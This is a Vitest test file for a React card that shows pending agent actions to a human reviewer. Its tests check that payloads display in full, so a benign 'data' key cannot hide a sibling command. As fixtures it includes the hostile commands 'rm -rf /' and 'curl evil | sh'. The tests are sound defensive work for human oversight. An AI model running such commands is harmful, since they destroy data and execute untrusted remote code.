import { fireEvent } from "@testing-library/react";
import { expect, test, vi } from "vitest";
import type { PendingHumanReviewModel } from "@/app/api/__generated__/models/pendingHumanReviewModel";
import { render, screen } from "@/tests/integrations/test-utils";
import { PendingReviewCard } from "../PendingReviewCard";

function makeReview(
  overrides: Partial<PendingHumanReviewModel> = {},
): PendingHumanReviewModel {
  return {
    node_exec_id: "ne-1",
    node_id: "n-1",
    user_id: "u-1",
    graph_exec_id: "run-1",
    graph_id: "g-1",
    graph_version: 1,
    payload: { to: "x@y.com" },
    instructions: "SendEmailBlock",
    editable: true,
    status: "WAITING",
    created_at: new Date(),
    ...overrides,
  };
}

// A block input that happens to carry a `data` key is the shape that used to
// collapse the card down to that one key, hiding every sibling it executes.
test("renders every key of a payload that carries a top-level data key", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        payload: { data: "tidy up temp files", command: "rm -rf /" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  const value = (screen.getByRole("textbox") as HTMLTextAreaElement).value;
  expect(value).toContain("rm -rf /");
  expect(value).toContain("tidy up temp files");
});

test("renders a bare payload unchanged", () => {
  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={() => {}}
    />,
  );

  const value = (screen.getByRole("textbox") as HTMLTextAreaElement).value;
  expect(value).toContain("x@y.com");
  expect(value).toContain("Invoice");
});

test("editing the payload reports the full edited object back, not just one key", () => {
  const onReviewDataChange = vi.fn();

  render(
    <PendingReviewCard
      review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
      onReviewDataChange={onReviewDataChange}
    />,
  );

  const textarea = screen.getByRole("textbox") as HTMLTextAreaElement;
  fireEvent.change(textarea, {
    target: {
      value: JSON.stringify({ to: "x@y.com", subject: "Updated invoice" }),
    },
  });

  expect(onReviewDataChange).toHaveBeenCalledTimes(1);
  const [nodeExecId, data] = onReviewDataChange.mock.calls[0];
  expect(nodeExecId).toBe("ne-1");
  expect(JSON.parse(data)).toEqual({
    to: "x@y.com",
    subject: "Updated invoice",
  });
});

test("a non-editable payload is displayed in full", () => {
  render(
    <PendingReviewCard
      review={makeReview({
        editable: false,
        payload: { data: "looks harmless", command: "curl evil | sh" },
      })}
      onReviewDataChange={() => {}}
    />,
  );

  expect(
    screen.getByText(
      (_, node) =>
        node?.tagName === "P" &&
        (node.textContent ?? "").includes("curl evil | sh"),
    ),
  ).toBeDefined();
});
